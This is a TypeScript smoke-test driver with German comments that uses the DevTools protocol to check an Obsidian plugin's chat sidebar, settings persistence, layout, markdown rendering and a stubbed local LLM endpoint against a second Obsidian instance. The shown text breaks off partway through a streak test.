/**
 * GUI-Smoke-Treiber — fährt die mechanisch entscheidbaren Punkte der Handover-Checkliste
 * gegen ein **laufendes** Obsidian statt von Hand.
 *
 * Warum getrackt (CORE-TEST-02 b): Die drei Funde vom 12.08.2026 — der nie speichernde
 * `enableChat`-Schalter, die aus dem Bild scrollende Eingabezeile, der stumme
 * Einrichtungs-Hinweis — waren allesamt für 362 grüne Unit-Tests unsichtbar, weil sie in
 * der Naht zwischen Plugin und Obsidian liegen: Settings-Rendering, Flexbox-Layout,
 * View-Lebenszyklus. Ein Treiber, der nur im Scratchpad liegt, ist beim nächsten Mal
 * wieder Handarbeit.
 *
 * Was er **nicht** prüft: den Ton (Schritt 11 der Checkliste). Ob sich Kuros Antworten
 * richtig anfühlen, ist keine mechanisch entscheidbare Frage — dafür bleibt die Hand-Runde.
 * Der Lauf sagt das ausdrücklich, statt die Lücke wie Abdeckung aussehen zu lassen.
 *
 * ## Zweitinstanz (der richtige Ort für diesen Lauf — eigenes Profil, eigener Port)
 *
 * Der Port ist PFLICHT (`--port <n>`, Wert dieses Rezepts: 9401); der Treiber hat keinen Default, damit ein
 * vergessener Port nie die reguläre Instanz (9222) trifft. Die reguläre Instanz wird weder genutzt noch
 * beendet. Reihenfolge laut obsidian-plugins/AGENTS.md § Staging-Vaults (a)–(c):
 *
 * ```bash
 * echo "$STAGING_VAULTS_DIR"                                    # muss gesetzt sein (~/.zshenv)
 * UD=/tmp/obs-test-kuro-gamification; mkdir -p "$UD"
 * lsof -nP -iTCP:9401 -sTCP:LISTEN && echo "Port belegt — anderen nehmen"
 * pgrep -f "user-data-dir=$UD" && echo "Profil belegt — $UD-w19 nehmen"
 * npm run build && OBSIDIAN_PLUGIN_DIR="$STAGING_VAULTS_DIR/kuro-gamification/.obsidian/plugins/kuro-gamification" npm run deploy
 * cp ~/Library/Application\ Support/obsidian/obsidian-<version>.asar "$UD"/        # (a) aktuelle statt gebündelter Version
 * node -e 'const p=process.env.STAGING_VAULTS_DIR+"/kuro-gamification";require("fs").writeFileSync(process.argv[1]+"/obsidian.json",JSON.stringify({vaults:{kuro15abc:{path:p,ts:Date.now(),open:true}},language:"en"}))' "$UD"
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=9401 &
 * # PID merken: beendet wird NUR sie, nie pkill/killall. Je Messlauf ein frischer Prozess.
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label kuro-gamification --intent "GUI-Smoke Zweitinstanz :9401" --exclusive focus --port 9401 --ttl 300
 * npm run smoke:gui -- --port 9401      # (b) Restricted Mode, (c) Vertrauensdialog: macht `bereiteInstanzVor`
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 * ```
 *
 * Der erste Lauf nach dem Anlegen eines Profils ist ein Aufwärmlauf und zählt nicht. `--vault` ist
 * optional (Default `kuro-gamification`, der Staging-Vault).
 *
 * ## Bilanz in vier Zuständen (CORE-TEST-19)
 *
 * grün · rot · übersprungen · nichts gemessen; `PUNKTE` ist der Nenner. Übersprungen heißt „nicht
 * anwendbar/nicht messbar“ (`ton/stimmt-der-ton`); „Gegenstand nicht erreicht“ (Oberfläche nicht gefunden,
 * kein Modell geladen, Messung abgebrochen) ist „nichts gemessen“ und setzt Exit 1. Abbruch: Exit 2.
 *
 * Typen: `tsconfig.scripts.json` (im `gate` über `npm run typecheck:scripts`). Es setzt
 * `lib: ["ES2022", "DOM"]` und `types: ["node"]` — der Treiber redet mit einem fremden
 * Renderer (Obsidians `app`, CDP-Antworten), braucht also DOM-Typen für die Ausdrücke,
 * die dort laufen, plus `lib.dom` für `WebSocket`. Die Datei trägt bewusst keine
 * Kommentare: biome liest `.json` strikt und bricht an ihnen ab.
 */

import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { cwd } from 'node:process';

import { Cdp, attachTo, beimAbbruch, bereiteInstanzVor, entferneFakeManager, installFakeManager as installZentralFakeManager, istAbgebrochen, pollUntil, requireVisible, schliesseEinstellungen as schliesseEinstellungenZentral } from '../../tools/obsidian-cdp/cdp.js';
import { messeFolge, zeichneFolge } from '../../tools/obsidian-cdp/folge.js';
import { gegenprobeErreichbarkeit, gegenprobeFokus, messeDenkblockKopierbar, messeErreichbarkeit, messeFokusErhalt, mitHoehe, optOutPflicht, zeichneDenkblock, zeichnePflicht, type PflichtTeilurteil } from '../../tools/obsidian-cdp/pflichtpunkte.js';
import { echoText, startLlmStub } from '../../tools/obsidian-cdp/llm-stub.js';
import { createBilanz, parseArgs, runDriver } from '../../tools/obsidian-cdp/bilanz.js';
import { buildHerkunft, requireEigenerBuild } from '../../tools/obsidian-cdp/vault.js';
import { boxOf, capture } from '../../tools/obsidian-cdp/shot.js';
import { de } from '../src/i18n/de';
import { en } from '../src/i18n/en';

const PLUGIN_ID = 'kuro-gamification';
const VIEW_TYPE = 'kuro-status-view';
/** Fester Test-Endpunkt — kein echter Nutzer konfiguriert exakt diese lokale Test-URL als
 *  einzigen Chat-Endpunkt. Dient als Marker fuer einen liegen gebliebenen Smoke-Rest. */
const SMOKE_ENDPOINT_URL = 'http://127.0.0.1:1234';

/* ---------------------------------------------------------------- Protokoll */

/** Soll-Liste aller Prüfpunkte (der Nenner der Bilanz). Ein Name, der hier fehlt, lässt `createBilanz`
 *  werfen; ein Punkt, der nie aufgezeichnet wird, zählt als „nichts gemessen“. */
const PUNKTE = [
  'vor/kein-liegen-gebliebener-endpunkt',
  'aus/ansicht-vorhanden',
  'aus/keine-tab-leiste',
  'aus/status-unveraendert',
  'ein/schalter-speichert',
  'ein/schalter-ueberlebt-neustart',
  'ein/tab-leiste-ohne-neuaufbau',
  'setup/hinweis-erscheint',
  'setup/hinweis-nennt-ort-und-beispiel',
  'layout/eingabezeile-sichtbar',
  'layout/log-scrollt-intern',
  'kontext/ausklapper-vorhanden',
  'kontext/vorschau-gleich-ausklapper',
  'sprache/platzhalter-englisch',
  'sprache/keine-deutschen-reste',
  'einstellungen/hilfe-zeile-steht-zuerst',
  'destruktiv/knoepfe-vorhanden',
  'destruktiv/farblich-abgesetzt',
  'herkunft/panel-vorhanden',
  'herkunft/genau-eine-zustandsklasse',
  'herkunft/aria-label',
  'herkunft/kein-roher-code',
  'herkunft/satz-0-ist-hinweis',
  'markdown/fertige-antwort-gerendert',
  'markdown/eigene-frage-bleibt-rohtext',
  'markdown/stream-abgeschlossener-absatz-gerendert',
  'kontext/zeile-folgt-der-notiz',
  'manager/einstellungen-zeigen-den-manager-abschnitt',
  'manager/lauf-nutzt-den-manager-endpunkt',
  'manager/modell-kommt-aus-defaultModel-nicht-aus-config',
  'manager/antwort-ist-gerendertes-markdown',
  'manager/ohne-manager-laeuft-die-lokale-liste',
  'stream/echter-endpunkt-liefert-tokens-einzeln',
  'anfrage/body-traegt-die-modus-defaults',
  'anfrage/abschnitt-klappt-auf-und-zeigt-die-felder',
  'anfrage/letzte-anfrage-steht-beim-oeffnen-da',
  'anfrage/zwei-bearbeitungen-hintereinander-lassen-ihn-offen',
  'anfrage/body-folgt-den-einstellungen',
  'anfrage/zuruecksetzen-entfernt-die-ueberschreibung',
  'verbindung/kein-apikey-in-data-json',
  'verbindung/bearer-header-aus-dem-schluesselbund',
  'verbindung/schwaerzung-platzhalter-hin-original-zurueck',
  'verbindung/antwort-mit-bild-url-erzeugt-kein-img',
  'verbindung/dataviewjs-block-rendert-als-text',
  'stream/folge-regel-respektiert-hochscrollen',
  'stream/folgt-ohne-stoerung',
  'stream/folgt-wieder-nach-dem-zurueckscrollen',
  'stream/folgt-ohne-stoerung-bei-absatzgrossen-stuecken',
  'stream/gemma-denken-nicht-in-der-antwort',
  'stream/denkblock-kopierbar',
  'stream/denkblock-gegenprobe',
  'pflicht/fokus-erhalt',
  'pflicht/fokus-gegenprobe',
  'pflicht/erreichbar-natuerliche-hoehe',
  'pflicht/erreichbar-kurzes-panel',
  'pflicht/erreichbar-gegenprobe',
  'streak/laufender-tag-ist-keine-luecke',
  'streak/arbeitstag-schalter-speichert',
  'streak/datumsformat-der-einstellung-gilt',
  'ton/stimmt-der-ton',
] as const;

const bilanz = createBilanz({ punkte: PUNKTE });

function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name as (typeof PUNKTE)[number], passed, detail);
}

/** Nicht anwendbar oder nicht messbar (der Ton) — kein Gegenstand, der erreichbar wäre. */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
}

/** Der Gegenstand des Punkts wurde nicht erreicht (Vorbedingung fehlt, Messung abgebrochen) —
 *  „nichts gemessen“, nie grün, Exit 1. */
function unmeasured(name: string, reason: string): void {
  bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
}

const aufgezeichnet = (name: string): boolean => bilanz.eintraege().some((e) => e.name === name);

/* ------------------------------------------------------------------ Helfer */

/** Eine Einstellung des Prüflings setzen. Kuro hält seinen Zustand in `data.settings`
 *  (nicht in `plugin.settings` wie die Kit-Brücke annimmt) und schreibt über `persist()`
 *  — deshalb ein eigener Helfer statt `setPluginSetting`. */
async function setSetting(cdp: Cdp, key: string, value: unknown): Promise<void> {
  await cdp.evaluate(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.data.settings[${JSON.stringify(key)}] = ${JSON.stringify(value)};
    // Die Verbindung merkt sich die lokale Auflösung bis invalidate() — die Einstellungen tun das nach jeder
    // Listen- und Modelländerung selbst, der Treiber setzt die Werte am Tab vorbei.
    p.llm?.invalidate();
    await p.persist();
    await new Promise((r) => setTimeout(r, 250));
    return true;
  `);
}

/** Sidebar von Grund auf neu bauen. `onOpen()` liest Sprache und `enableChat` **einmal**
 *  beim Bau der Tab-Leiste — wer nur eine Einstellung umstellt und dann misst, misst den
 *  alten Baum. */
async function rebuildSidebar(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    for (const leaf of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) leaf.detach();
    await new Promise((r) => setTimeout(r, 300));
    await app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].activateSidebar();
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);
}

/** Die Kuro-Ansicht im DOM. Als Ausdruck, weil jeder Prüfpunkt von ihr ausgeht. */
const VIEW_EL = `document.querySelector(".workspace-leaf-content[data-type='${VIEW_TYPE}']")`;

/* ---------------------------------------------------- 1 · Aus-Zustand */

async function sektionAus(cdp: Cdp): Promise<void> {
  await setSetting(cdp, 'enableChat', false);
  await rebuildSidebar(cdp);

  // Erst die Existenz der Ansicht belegen, dann eine Eigenschaft prüfen: ein Vergleich
  // gegen ein nicht vorhandenes Element wird sonst ausgerechnet im Defektfall grün.
  const da = await pollUntil<boolean>(cdp, `return Boolean(${VIEW_EL});`, 10_000);
  if (!da) {
    record('aus/ansicht-vorhanden', false, 'Kuro-Ansicht ist nach activateSidebar nicht im DOM');
    return;
  }
  record('aus/ansicht-vorhanden', true, 'Seitenleiste offen');

  const befund = await cdp.evaluate<{ tabbar: number; chatbody: number; toolbar: number }>(`
    const view = ${VIEW_EL};
    return {
      tabbar: view.querySelectorAll(".okit-hub-root").length,
      chatbody: view.querySelectorAll(".kuro-chat-body").length,
      toolbar: view.querySelectorAll(".kuro-toolbar").length,
    };
  `);
  record(
    'aus/keine-tab-leiste',
    befund.tabbar === 0 && befund.chatbody === 0,
    `tabbar=${befund.tabbar}, chat-body=${befund.chatbody} (beide 0 erwartet)`,
  );
  record(
    'aus/status-unveraendert',
    befund.toolbar === 1,
    `Werkzeugleiste ${befund.toolbar}× — die Ansicht sieht aus wie ohne Chat`,
  );
}

/* --------------------------------- 2 · Einschalten (Regression 12.08.) */

async function sektionEinschalten(cdp: Cdp): Promise<void> {
  // Der Bug vom 12.08. saß NICHT im Zustand, sondern in der Datenbrücke des Settings-Tabs:
  // `setControlValue` hatte für 'enableChat' keinen `case` und fiel auf `default: return`.
  // Deshalb wird hier genau dieser Weg gegangen — ein direktes Setzen von
  // `data.settings.enableChat` würde den Defekt nicht berühren und grün melden.
  const ueberBruecke = await cdp.evaluate<{ ok: boolean; grund?: string; wert?: unknown }>(`
    if (!app.setting) return { ok: false, grund: "app.setting fehlt" };
    await app.setting.open();
    await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 500));
    const tab = app.setting.activeTab;
    if (!tab || typeof tab.setControlValue !== "function") {
      return { ok: false, grund: "Settings-Tab bietet kein setControlValue" };
    }
    await tab.setControlValue("enableChat", true);
    await new Promise((r) => setTimeout(r, 400));
    return { ok: true, wert: app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].data.settings.enableChat };
  `);

  if (!ueberBruecke.ok) {
    unmeasured('ein/schalter-speichert', ueberBruecke.grund ?? 'unbekannt');
    await setSetting(cdp, 'enableChat', true);
  } else {
    record(
      'ein/schalter-speichert',
      ueberBruecke.wert === true,
      `setControlValue("enableChat", true) → data.settings.enableChat = ${JSON.stringify(ueberBruecke.wert)}`,
    );

    // Zweite Hälfte desselben Defekts: der Wert stand im Speicher, überlebte aber keinen
    // Neustart. Gemessen wird deshalb die Datei auf Platte, nicht das Objekt.
    const aufPlatte = await cdp.evaluate<boolean | null>(`
      const pfad = app.vault.configDir + "/plugins/${PLUGIN_ID}/data.json";
      const roh = await app.vault.adapter.read(pfad);
      const daten = JSON.parse(roh);
      return daten?.settings?.enableChat ?? null;
    `);
    record(
      'ein/schalter-ueberlebt-neustart',
      aufPlatte === true,
      `data.json auf Platte: enableChat = ${JSON.stringify(aufPlatte)}`,
    );
  }

  await schliesseEinstellungenZentral(cdp);

  // Zustand nach der MESSUNG herstellen, nicht davor: die folgenden Abschnitte prüfen
  // Layout, Kontext und Sprache und brauchen dafür einen eingeschalteten Chat. Ohne das
  // reißt ein Defekt im Schalter alle späteren Punkte mit rot — ein Prüfprotokoll, das
  // einen Fehler siebenfach meldet, sagt nicht mehr, wo er sitzt.
  await setSetting(cdp, 'enableChat', true);

  // Die Tab-Leiste muss **ohne** Neuaufbau der Seitenleiste erscheinen: `onOpen()` liest
  // `enableChat` nur einmal, deshalb gibt es `syncChatUI()`. Ohne den Aufruf bliebe eine
  // schon offene Seitenleiste stumm bis zum Schließen und Neuöffnen.
  await cdp.evaluate(`
    app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].syncChatUI();
    await new Promise((r) => setTimeout(r, 600));
    return true;
  `);
  const tabs = await cdp.evaluate<string[]>(`
    const view = ${VIEW_EL};
    return view ? [...view.querySelectorAll(".okit-hub-tab")].map((b) => b.textContent.trim()) : [];
  `);
  record(
    'ein/tab-leiste-ohne-neuaufbau',
    tabs.length === 2,
    `Tabs sichtbar: ${tabs.length ? tabs.join(' · ') : '(keine)'} — syncChatUI ohne Sidebar-Neustart`,
  );
}

/* --------------------------------------- 3 · Einrichtungs-Hinweis */

async function sektionSetupHinweis(cdp: Cdp): Promise<void> {
  await setSetting(cdp, 'chatEndpoints', []);
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);

  const hinweis = await pollUntil<string>(
    cdp,
    `const el = ${VIEW_EL}?.querySelector(".kuro-chat-body .kuro-empty");
     return el ? el.textContent.trim() : null;`,
    8000,
  );
  if (!hinweis) {
    record('setup/hinweis-erscheint', false, 'kein .kuro-empty im Chat-Tab bei leerer Endpunkt-Liste');
    return;
  }
  record('setup/hinweis-erscheint', true, `${hinweis.slice(0, 60)}…`);

  // Der Fund vom 12.08.: der Hinweis sagte nur „Endpunkt und Modell eintragen" und ließ
  // offen, wo. Geprüft wird deshalb der Inhalt, nicht die Anwesenheit.
  record(
    'setup/hinweis-nennt-ort-und-beispiel',
    hinweis.includes('localhost:1234') && /Endpunkte|Endpoints/.test(hinweis),
    'Hinweis nennt die Sektion und eine Beispieladresse',
  );
}

async function oeffneChatTab(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    const view = ${VIEW_EL};
    const tabs = view ? [...view.querySelectorAll(".okit-hub-tab")] : [];
    if (tabs[1]) tabs[1].click();
    await new Promise((r) => setTimeout(r, 400));
    return true;
  `);
}

/* ------------------------------- 4 · Layout (Regression 12.08.) */

async function sektionLayout(cdp: Cdp): Promise<void> {
  // Der teuerste Fund des Hand-Smokes: die Log-Box wuchs mit der Unterhaltung, statt
  // intern zu scrollen — Eingabezeile und Abbrechen-Knopf rutschten bei langen Antworten
  // aus dem Bild. Gemessen wird der Effekt (liegt die Eingabezeile im sichtbaren
  // Bereich?), nicht die Ursache (`min-height:0` gesetzt?) — die Klasse war auch im
  // Defektfall vorhanden.
  await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL }]);
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);

  const gefuellt = await cdp.evaluate<boolean>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.chatSession.reset();
    for (let i = 0; i < 30; i++) {
      p.chatSession.append({
        role: i % 2 === 0 ? "user" : "assistant",
        text: "Zeile " + i + " — " + "Lorem ipsum dolor sit amet, consetetur sadipscing elitr. ".repeat(4),
      });
    }
    for (const leaf of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) {
      leaf.view.renderChat?.();
    }
    await new Promise((r) => setTimeout(r, 600));
    return true;
  `);
  if (!gefuellt) {
    for (const n of ['layout/eingabezeile-sichtbar', 'layout/log-scrollt-intern'] as const) unmeasured(n, 'Chat-Verlauf ließ sich nicht befüllen');
    return;
  }

  // Der Bezugsrahmen ist die **Seitenleiste**, nicht der Chat-Body: im Defektfall wächst
  // der Body mit dem Verlauf mit, ein Vergleich `inputBottom <= bodyBottom` wäre dann
  // trivial wahr und ausgerechnet beim echten Fehler grün. Gemessen am 2026-08-17 — die
  // erste Fassung dieses Punktes blieb mit ausgebautem Fix grün, und zwar aus genau
  // diesem Grund. Der Container hat feste Höhe; wer aus ihm herausragt, ist unerreichbar.
  const mass = await cdp.evaluate<{
    ok: boolean;
    grund?: string;
    inputBottom?: number;
    containerBottom?: number;
    scrollHeight?: number;
    clientHeight?: number;
  }>(`
    const view = ${VIEW_EL};
    if (!view) return { ok: false, grund: "keine Kuro-Ansicht" };
    const body = view.querySelector(".kuro-chat-body");
    if (!body) return { ok: false, grund: "kein .kuro-chat-body" };
    const log = body.querySelector(".kuro-chat-log");
    const row = body.querySelector(".kuro-chat-inputrow");
    if (!log || !row) return { ok: false, grund: "Log oder Eingabezeile fehlt" };
    return {
      ok: true,
      inputBottom: row.getBoundingClientRect().bottom,
      containerBottom: view.getBoundingClientRect().bottom,
      scrollHeight: log.scrollHeight,
      clientHeight: log.clientHeight,
    };
  `);
  if (!mass.ok) {
    for (const n of ['layout/eingabezeile-sichtbar', 'layout/log-scrollt-intern'] as const) unmeasured(n, mass.grund ?? 'Messung nicht möglich');
    return;
  }

  const toleranz = 2;
  record(
    'layout/eingabezeile-sichtbar',
    (mass.inputBottom ?? 0) <= (mass.containerBottom ?? 0) + toleranz,
    `Eingabezeile endet bei ${Math.round(mass.inputBottom ?? 0)}px, Seitenleiste bei ${Math.round(mass.containerBottom ?? 0)}px`,
  );
  record(
    'layout/log-scrollt-intern',
    (mass.scrollHeight ?? 0) > (mass.clientHeight ?? 0),
    `Log: scrollHeight ${Math.round(mass.scrollHeight ?? 0)} > clientHeight ${Math.round(mass.clientHeight ?? 0)}`,
  );
}

/* ------------------------------------------ 5 · Kontext-Ausklapper */

async function sektionKontext(cdp: Cdp): Promise<void> {
  // „Vorschau nie nachbauen" ist eine tragende Entscheidung: Settings-Vorschau,
  // Chat-Ausklapper und Prompt rufen dieselbe `renderDailyExtract`. Eine zweite
  // Formatierung würde driften und beruhigend etwas anderes zeigen, als gesendet wird.
  // Geprüft wird die Gleichheit der beiden **sichtbaren** Stellen.
  await oeffneChatTab(cdp);
  const ausklapper = await pollUntil<string>(
    cdp,
    `const el = ${VIEW_EL}?.querySelector(".kuro-chat-context .kuro-chat-context-body");
     return el ? el.textContent : null;`,
    8000,
  );
  if (ausklapper === null) {
    unmeasured('kontext/vorschau-gleich-ausklapper', 'kein Kontext-Ausklapper im Chat-Tab');
    return;
  }
  record('kontext/ausklapper-vorhanden', true, `${ausklapper.trim().length} Zeichen`);

  // Die Settings sind ab Obsidian 1.13 ein eigenes Fenster: `openTabById` gelingt, das
  // Modal-DOM im Workspace-Fenster bleibt aber leer. Beide Fälle offen halten und aus der
  // Sache ableiten, welcher vorliegt — nie über den (lokalisierten) Fenstertitel.
  await cdp.evaluate(`
    await app.setting.open();
    await app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);

  const imHauptfenster = await cdp.evaluate<string | null>(`
    const box = document.querySelector(".modal.mod-settings .kuro-context-preview");
    return box ? box.textContent : null;
  `);

  let vorschau = imHauptfenster;
  let quelle = 'Modal im Hauptfenster';
  if (vorschau === null) {
    const fenster = await attachTo('settings', PORT);
    if (fenster) {
      vorschau = await fenster.evaluate<string | null>(`
        const box = document.querySelector(".kuro-context-preview");
        return box ? box.textContent : null;
      `);
      quelle = 'eigenes Einstellungen-Fenster (Obsidian ≥ 1.13)';
      fenster.close();
    }
  }

  await schliesseEinstellungenZentral(cdp);

  if (vorschau === null) {
    unmeasured(
      'kontext/vorschau-gleich-ausklapper',
      'Vorschau-Box in den Einstellungen nicht gefunden (weder Modal noch eigenes Fenster)',
    );
    return;
  }
  record(
    'kontext/vorschau-gleich-ausklapper',
    vorschau.trim() === ausklapper.trim(),
    `${quelle}: ${vorschau.trim() === ausklapper.trim() ? 'identisch' : 'ABWEICHUNG'}`,
  );
}


/* -------------------------------------------- 9 · Markdown, Kontext-Sync, Manager */

const MANAGER_PLUGIN_ID = 'llm-endpoint-manager';
const MANAGER_DEFAULT_MODEL = 'smoke-manager-modell';

/** Fake-Chat-Endpunkt: dünne Hülle über den zentralen LLM-Stub (`tools/obsidian-cdp/llm-stub.ts`). Streamt eine
 *  Antwort mit Markdown und merkt sich Anfragen und Modell. CORS ist im Stub Default (der Renderer läuft unter
 *  app://obsidian.md, ohne die Header sieht der Server die Anfrage nie — gemessen 2026-09-15 in lingotuner). */
interface FakeChat { url: string; close: () => Promise<void>; calls: () => number; lastModel: () => string | null; lastBody: () => Record<string, unknown> | null; lastAuth: () => string | null }
/** `echo`: die Antwort wiederholt den letzten Nutzertext, wie der Server ihn empfangen hat (der Platzhalter, wenn das
 *  Plugin geschwärzt hat) — so zeigt sich, was nach der Wiederherstellung im Chat landet. */
async function startFakeChat(opts: { echo?: boolean } = {}): Promise<FakeChat> {
  const stub = await startLlmStub({
    models: [MANAGER_DEFAULT_MODEL],
    // Der Prüfpunkt wartet auf das Präfix „echo:“ — der Stub-Standard „echo“ liefert den Nutzertext ohne es.
    antwort: opts.echo === true ? (anfrage) => ({ text: `echo: ${echoText(anfrage.json)}` }) : undefined,
    standard: { stuecke: ['Antwort mit **Fettung**', '\n\n', '- eins\n- zwei'] },
  });
  const letzte = () => stub.letzte('chat');
  return {
    url: stub.url,
    close: () => stub.stop(),
    calls: () => stub.zaehler().chat,
    lastModel: () => (letzte()?.json as { model?: string } | null)?.model ?? null,
    lastBody: () => (letzte()?.json as Record<string, unknown> | null) ?? null,
    lastAuth: () => {
      const h = letzte()?.header.authorization;
      return typeof h === 'string' ? h : null;
    },
  };
}

/** Fake `llm-endpoint-manager` (zentral, `installFakeManager` aus der Brücke). `config.model` trägt bewusst NICHT das
 *  Standardmodell (`configModel: 'falle'`): der echte Manager setzt es zusätzlich zu `defaultModel`, und wer
 *  `config.model` statt `result.model` sendet, überschreibt eine getroffene Modellwahl (lingotuner-Befund C1). */
async function installFakeManager(cdp: Cdp, url: string): Promise<void> {
  await installZentralFakeManager(cdp, {
    endpunkte: [{ id: 'fake-ep', label: 'Fake Endpoint', url, models: [MANAGER_DEFAULT_MODEL], defaultModel: MANAGER_DEFAULT_MODEL, capabilities: ['chat'], configModel: 'falle' }],
    pluginId: MANAGER_PLUGIN_ID,
    invalidiere: [PLUGIN_ID],
  });
}

/** Stellt den vorgefundenen Registry-Eintrag wieder her. Idempotent, gehört an jedes Ende. */
async function removeFakeManager(cdp: Cdp): Promise<void> {
  await entferneFakeManager(cdp, { pluginId: MANAGER_PLUGIN_ID, invalidiere: [PLUGIN_ID] });
}

async function sektionMarkdown(cdp: Cdp): Promise<void> {
  await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL }]);
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);

  // (a) Fertige Antwort: Fettung und Liste müssen als Elemente da sein, nicht als Sternchen.
  await cdp.evaluate(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.chatSession.reset();
    p.chatSession.append({ role: "user", text: "eine *Frage*" });
    p.chatSession.append({ role: "assistant", text: "Das ist **fett**.\\n\\n- eins\\n- zwei" });
    p.syncChat();
    return true;
  `);
  const fertig = await pollUntil<{ strong: number; li: number; frageRoh: boolean; ws: string } | null>(
    cdp,
    `const v = ${VIEW_EL};
     const md = v?.querySelector(".kuro-chat-assistant .kuro-chat-md");
     if (!md || md.querySelectorAll("li").length < 2) return null;
     const frage = v.querySelector(".kuro-chat-user .kuro-chat-text");
     return { strong: md.querySelectorAll("strong").length, li: md.querySelectorAll("li").length,
              frageRoh: frage?.textContent === "eine *Frage*" && !frage.querySelector("em"),
              ws: getComputedStyle(md).whiteSpace };`,
    6000,
  );
  record(
    'markdown/fertige-antwort-gerendert',
    fertig !== null && fertig.strong === 1 && fertig.li === 2,
    fertig === null ? 'kein gerendertes Markdown im Chat' : `${fertig.strong}× <strong>, ${fertig.li}× <li>, white-space ${fertig.ws}`,
  );
  record(
    'markdown/eigene-frage-bleibt-rohtext',
    fertig?.frageRoh === true,
    fertig?.frageRoh === true ? 'Sternchen der Frage unverändert' : 'Frage wurde gerendert oder fehlt',
  );

  // (b) Stream: ein abgeschlossener Absatz wird gerendert, der laufende bleibt Rohtext.
  const stream = await cdp.evaluate<{ block: number; strong: number; tail: string } | null>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    p.chatSession.reset();
    p.chatSession.streaming = "";
    p.syncChat();
    await new Promise((r) => setTimeout(r, 300));
    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
    leaf.view.appendChatToken("Erster **Absatz**\\n\\nZwei");
    await new Promise((r) => setTimeout(r, 600));
    const v = ${VIEW_EL};
    const c = v?.querySelector(".kuro-chat-stream-content");
    const out = c ? { block: c.querySelectorAll(".okit-stream-block").length,
      strong: c.querySelectorAll(".okit-stream-block strong").length,
      tail: c.querySelector(".okit-stream-tail")?.textContent ?? "" } : null;
    p.chatSession.streaming = null;
    p.chatSession.reset();
    p.syncChat();
    return out;
  `);
  record(
    'markdown/stream-abgeschlossener-absatz-gerendert',
    stream !== null && stream.block === 1 && stream.strong === 1 && stream.tail === 'Zwei',
    stream === null ? 'keine laufende Zeile im Chat' : `${stream.block} Block, ${stream.strong}× <strong>, Tail „${stream.tail}“`,
  );
}

async function sektionKontextSync(cdp: Cdp): Promise<void> {
  // Der Regress: refreshStatus las die Tagesnotiz neu, der offene Chat-Tab zeigte weiter den
  // alten Stand. Gemessen wird die sichtbare Zeile nach einer echten Änderung der Notiz.
  await setSetting(cdp, 'chatDailyContext', 'tasks');
  await rebuildSidebar(cdp);
  await oeffneChatTab(cdp);
  const lauf = await cdp.evaluate<{ vorher: string; nachher: string } | { fehler: string }>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    const path = p.data.settings.dailyFolder + "/" + d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate()) + ".md";
    const adapter = app.vault.adapter;
    const existierte = await adapter.exists(path);
    const original = existierte ? await adapter.read(path) : null;
    const zeile = () => ${VIEW_EL}?.querySelector(".kuro-chat-context-summary")?.textContent ?? "";
    try {
      await adapter.write(path, "- [ ] smoke-eins\\n");
      await p.refreshStatus(true);
      await new Promise((r) => setTimeout(r, 300));
      const vorher = zeile();
      await adapter.write(path, "- [ ] smoke-eins\\n- [ ] smoke-zwei\\n- [ ] smoke-drei\\n");
      await p.refreshStatus(true);
      await new Promise((r) => setTimeout(r, 300));
      return { vorher, nachher: zeile() };
    } catch (e) {
      return { fehler: String(e) };
    } finally {
      if (existierte) await adapter.write(path, original);
      else await adapter.remove(path);
      await p.refreshStatus(true);
    }
  `);
  if ('fehler' in lauf) {
    unmeasured('kontext/zeile-folgt-der-notiz', lauf.fehler);
    return;
  }
  const zahl = (text: string): number | null => {
    const m = /\d+/.exec(text);
    return m ? Number(m[0]) : null;
  };
  record(
    'kontext/zeile-folgt-der-notiz',
    zahl(lauf.vorher) === 1 && zahl(lauf.nachher) === 3,
    `„${lauf.vorher}“ → „${lauf.nachher}“ (ohne den Chat-Tab neu zu öffnen)`,
  );
}

async function sektionStreak(cdp: Cdp): Promise<void> {
  // Eigener Tagesordner, damit weder das Fixture noch eine echte Tagesnotiz den Streak mitbestimmt.
  // Gemessen wird der Fehler vom 10.10.: Ohne Notiz für heute war der Streak 0, obwohl gestern und
  // vorgestern erledigt waren.
  const lauf = await cdp.evaluate<{ streak: number; seite: string } | { fehler: string }>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    const ordner = "smoke-streak";
    const alt = p.data.settings.dailyFolder;
    const adapter = app.vault.adapter;
    const iso = (back) => {
      const d = new Date(); d.setDate(d.getDate() - back);
      const pad = (n) => String(n).padStart(2, "0");
      return d.getFullYear() + "-" + pad(d.getMonth() + 1) + "-" + pad(d.getDate());
    };
    try {
